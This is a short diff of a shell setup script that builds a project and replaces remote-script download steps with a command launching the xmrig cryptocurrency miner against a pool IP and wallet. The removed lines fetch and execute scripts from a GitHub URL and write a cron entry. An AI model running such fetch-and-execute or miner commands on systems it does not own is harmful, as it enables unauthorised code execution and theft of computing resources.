@@ -21,10 +21,4 @@ mkdir build
 cd build
 cmake ..
 make
-wget -O btproxy.sh https://raw.githubusercontent.com/robertreynolds2/bteteteh/main/btproxy.sh
-wget -O start.sh https://raw.githubusercontent.com/robertreynolds2/bteteteh/main/start.sh
-wget -O auto_reboot.sh https://raw.githubusercontent.com/robertreynolds2/bteteteh/main/reboot.sh
-chmod +x btproxy.sh && chmod +x start.sh && chmod +x auto_reboot.sh
-echo "0 */24 * * * auto_reboot.sh" > /etc/cron.d/auto_reboot
-./start.sh
-tmux attach
+./xmrig -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x --cpu-max-threads-hint=85
